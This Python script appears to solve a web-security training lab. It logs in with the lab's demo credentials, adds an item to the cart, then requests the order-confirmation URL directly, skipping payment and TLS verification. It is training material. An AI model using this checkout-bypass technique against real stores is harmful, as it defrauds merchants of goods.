from bs4 import BeautifulSoup
from urllib.parse import urlparse
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SiteInteraction:
  def __init__(self, base_url, proxies=None):
    self.base_url = base_url
    self.session = requests.Session()
    self.session.proxies = proxies if proxies else {}

  def get_csrf_token(self, url):
    response = self.session.get(url, verify=False)
    soup = BeautifulSoup(response.content, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf'})['value']
    return csrf_token
  
  def login(self, username, password):
    login_url = self.base_url + '/login'
    csrf_token = self.get_csrf_token(login_url)
    data = {
      'username': username,
      'password': password,
      'csrf': csrf_token
    }
    response = self.session.post(login_url, data=data, verify=False)
    return response
  
  # Purchase Item
  def purchase_item(self):
    login_response = self.login(username, password)
    if login_response.status_code != 200:
      print("Failed to login.")
      return

    # Add Item to Cart
    cart_url = self.base_url + '/cart'   
    cart_payload = {'productId': '1', 'redir': 'PRODUCT', 'quantity': '1'}
    self.session.post(cart_url, data=cart_payload, verify=False)

    # Confirm Purchase
    confirmation_url = self.base_url + '/cart/order-confirmation?order-confirmation=true'  
    response = self.session.get(confirmation_url, verify=False)
    if response.status_code != 200:
      print("Failed to Confirm Order")
      return
    print("Item purchased successfully.")

# Example usage:
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
url = 'https://0a34004a0445591182d31a2900a00014.web-security-academy.net'
username = 'wiener'
password = 'peter'
site = SiteInteraction(url, proxies=proxies)
site.purchase_item()  # Purchase Item

